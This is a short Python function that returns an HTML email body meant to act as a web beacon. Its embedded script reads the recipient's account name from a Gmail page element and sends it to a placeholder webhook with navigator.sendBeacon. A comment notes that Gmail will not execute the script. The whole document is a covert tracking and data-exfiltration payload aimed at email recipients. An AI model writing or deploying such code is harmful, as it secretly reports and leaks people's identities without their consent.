# Gmail can't execute <script>
def web_beacon():
    return '''
<h1>I know you've read this mail</h1>
<div style="color:red">By webhook</div>
<script>
let data = new FormData();
data.append('account', document.getElementsByClassName("eYSAde")[0].innerText);
navigator.sendBeacon('{webhook}', data);
</script>
'''